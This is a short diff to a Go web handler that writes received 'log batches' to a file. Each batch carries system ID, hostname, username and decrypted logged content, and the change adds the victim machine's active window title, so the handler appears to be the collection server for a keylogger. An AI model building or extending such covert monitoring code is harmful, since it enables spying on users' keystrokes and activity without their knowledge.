@@ -70,7 +70,7 @@ func logHandler(c *gin.Context) {
 	logFilePath := filepath.Join(logDir, logFileName)
 	logEntry := fmt.Sprintf(
 		"----- Log Batch Start (UTC: %s, Duration: %.2fs) -----\n"+
-			"System ID: %s\nHostname: %s\nOS: %s (%s)\nUsername: %s\n"+
+			"System ID: %s\nHostname: %s\nOS: %s (%s)\nUsername: %s\nActive Window: %s\n"+
 			"Logged Content:\n%s\n"+
 			"----- Log Batch End (Server UTC: %s) -----\n\n",
 		payload.LogStartTimeUTC,
@@ -80,6 +80,7 @@ func logHandler(c *gin.Context) {
 		payload.SystemInfo.OS,
 		payload.SystemInfo.OSRelease,
 		payload.SystemInfo.Username,
+		payload.SystemInfo.ActiveWindow,
 		decryptedLogContent,
 		time.Now().Format("2006-01-02 15:04:05"),
 	)
